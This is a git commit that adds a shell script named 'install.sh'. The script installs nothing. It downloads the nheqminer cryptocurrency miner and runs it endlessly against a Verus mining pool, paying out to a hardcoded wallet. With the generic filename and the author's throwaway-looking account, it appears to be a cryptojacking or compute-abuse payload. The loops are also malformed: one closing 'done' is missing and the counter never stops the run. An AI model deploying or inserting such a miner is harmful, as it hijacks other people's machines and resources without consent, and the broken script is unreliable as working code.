d78c9ce2a8571fbb663db25deb02de6951464947
nosmould864 <pertuyulan7@hotmail.com>
2021-05-26 06:00:35 +0000

    Add 'install.sh'

---
+++ install.sh
@@ -0,0 +1,14 @@
+#!/bin/sh
+ 
+COUNTER=20
+until [  $COUNTER -lt 10 ]; do
+
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tgz
+tar xf nheqminer-Linux-v0.8.2.tar.gz
+cd nheqminer 
+ while [ 1 ]; do
+./nheqminer -v -l pool.verus.io:9999 -u RYA9hTgYmNFayype84LN2cHCD2qg1bY4KK.ms -p x -t 2
+ 
+     echo COUNTER $COUNTER
+     let COUNTER-=1
+done
